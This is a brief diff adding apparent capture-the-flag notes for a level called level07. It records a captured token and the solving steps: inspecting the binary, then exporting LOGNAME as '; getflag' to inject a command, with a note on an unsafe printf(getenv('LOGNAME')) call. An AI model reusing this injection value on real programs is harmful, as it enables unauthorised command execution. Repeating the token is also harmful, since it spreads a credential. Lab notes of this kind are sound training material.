@@ -1,0 +1,12 @@
+flag
+token fiumuikeil55xe9cu4dood66h
+
+ls -la
+
+getfacl level07
+
+strings ./level07 | grep LOGNAME
+
+export LOGNAME="; getflag"
+
+printf(getenv("LOGNAME"))
